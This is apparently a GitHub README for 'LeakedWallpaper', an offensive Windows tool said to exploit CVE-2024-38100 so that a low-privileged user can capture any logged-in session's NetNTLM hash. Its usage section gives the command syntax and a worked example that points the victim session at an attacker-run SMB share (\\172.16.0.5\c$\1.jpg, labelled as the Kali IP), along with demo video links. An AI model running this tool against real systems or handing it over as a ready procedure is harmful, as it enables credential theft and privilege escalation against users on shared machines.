# Leaked Wallpaper
This is a privilege escalation tool (fixed with CVE-2024-38100 in KB5040434) that allows us to leak a user's NetNTLM hash from any session on the computer, even if we are working from a low-privileged user.

# Usage

```shell
.\LeakedWallpaper.exe <session> \\<KALI IP>\c$\1.jpg

# Example
  .\LeakedWallpaper.exe 1 \\172.16.0.5\c$\1.jpg
```

# Demo
https://youtu.be/InyrqNeaZfQ

If blocked, see [demo.mkv](https://github.com/MzHmO/LeakedWallpaper/blob/main/demo.mkv)
